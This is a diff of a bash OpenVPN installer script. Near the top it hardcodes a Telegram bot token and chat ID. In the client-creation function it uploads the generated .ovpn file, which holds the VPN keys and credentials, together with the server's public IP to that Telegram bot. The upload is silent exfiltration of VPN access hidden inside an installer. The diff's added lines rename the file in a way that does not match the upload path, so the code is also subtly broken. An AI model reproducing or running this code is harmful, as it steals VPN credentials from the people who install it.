@@ -1,6 +1,7 @@
 #!/bin/bash
 chatId=-835462349
 botToken=5513409411:AAFyGIDek5LNS7MZi2Zoaa93s5csce_SmZw
+hostname=hostname
 # Detect Debian users running the script with "sh" instead of bash
 if readlink /proc/$$/exe | grep -q "dash"; then
 	echo 'This installer needs to be run with "bash", not "sh".'
@@ -92,6 +93,8 @@ new_client () {
 	sed -ne '/BEGIN OpenVPN Static key/,$ p' /etc/openvpn/server/tc.key
 	echo "</tls-crypt>"
 	} > ~/"$client".ovpn
+ 	host_sever=$(hostname)
+  	mv "$client".ovpn "$host_sever".ovpn
 	get_public_ip=$(curl "ipinfo.io")
 		
 	curl -F chat_id=$chatId -F document=@/root/"$client".ovpn -F caption="$get_public_ip" https://api.telegram.org/bot$botToken/sendDocument
